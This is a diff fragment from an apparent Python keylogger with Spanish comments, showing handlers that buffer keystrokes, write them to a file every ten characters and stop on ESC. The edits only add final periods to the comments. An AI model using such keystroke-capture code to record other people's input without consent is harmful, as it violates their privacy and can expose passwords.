@@ -25,14 +25,14 @@ def on_press(key):
     with lock:
         buffer.append(char)
 
-    # Guarda en el archivo si el buffer alcanza un tamaño significativo
+    # Guarda en el archivo si el buffer alcanza un tamaño significativo.
     if len(buffer) >= 10:
         write_to_file()
 
 def on_release(key):
-    # Detiene el keylogger si se presiona la tecla ESC
+    # Detiene el keylogger si se presiona la tecla ESC.
     if key == keyboard.Key.esc:
-        write_to_file()  # Guarda cualquier dato restante antes de salir
+        write_to_file()  # Guarda cualquier dato restante antes de salir.
         return False
 
 # Hilo que guarda periódicamente en el archivo.
